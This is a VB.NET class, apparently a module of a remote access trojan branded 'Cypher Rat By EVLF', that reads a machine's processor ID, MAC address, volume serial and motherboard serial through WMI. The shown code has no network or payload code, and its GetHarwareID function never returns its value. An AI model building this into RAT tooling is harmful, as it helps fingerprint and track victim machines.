Imports System.Management
Imports System
Imports System.Text
Imports System.Security.Cryptography
'------------------------------------
'---------Cypher Rat By EVLF
'-----------------------------------
'---------t.me/evlfdev
'------------------------------------
Public Class clsComputerInfo
    Friend Function GetProcessorId() As String
        Dim strProcessorId As String = String.Empty
        Dim query As New SelectQuery("Win32_processor")
        Dim search As New ManagementObjectSearcher(query)
        Dim info As ManagementObject
        For Each info In search.Get()
            strProcessorId = info("processorId").ToString()
        Next
        Return strProcessorId
    End Function
    Friend Function GetMACAddress() As String
        Dim mc As ManagementClass = New ManagementClass("Win32_NetworkAdapterConfiguration")
        Dim moc As ManagementObjectCollection = mc.GetInstances()
        Dim MACAddress As String = String.Empty
        For Each mo As ManagementObject In moc
            If (MACAddress.Equals(String.Empty)) Then
                If CBool(mo("IPEnabled")) Then MACAddress = mo("MacAddress").ToString()
                mo.Dispose()
            End If
            MACAddress = MACAddress.Replace(":", String.Empty)
        Next
        Return MACAddress
    End Function
    Friend Function GetVolumeSerial(Optional ByVal strDriveLetter As String = "C") As String
        Dim disk As ManagementObject = New ManagementObject(String.Format("win32_logicaldisk.deviceid=""{0}:""", strDriveLetter))
        disk.Get()
        Return disk("VolumeSerialNumber").ToString()
    End Function
    Friend Function GetMotherBoardID() As String
        Dim strMotherBoardID As String = String.Empty
        Dim query As New SelectQuery("Win32_BaseBoard")
        Dim search As New ManagementObjectSearcher(query)
        Dim info As ManagementObject
        For Each info In search.Get()
            strMotherBoardID = info("SerialNumber").ToString()
        Next
        Return strMotherBoardID
    End Function
     Friend Function GetHarwareID() As String
        Dim mboardstr As String = ""
        Dim query As String = "Select SerialNumber From Win32_BaseBoard"
         Using mbs As ManagementObjectSearcher = New ManagementObjectSearcher(query)
            For Each mo As ManagementObject In mbs.Get
                For Each pd As PropertyData In mo.Properties
                     If pd.Name = "SerialNumber" Then
                         If pd.Value IsNot Nothing Then
                            mboardstr = pd.Value.ToString
                        End If
                        Exit For
                    End If
                Next
            Next
        End Using
    End Function
End Class
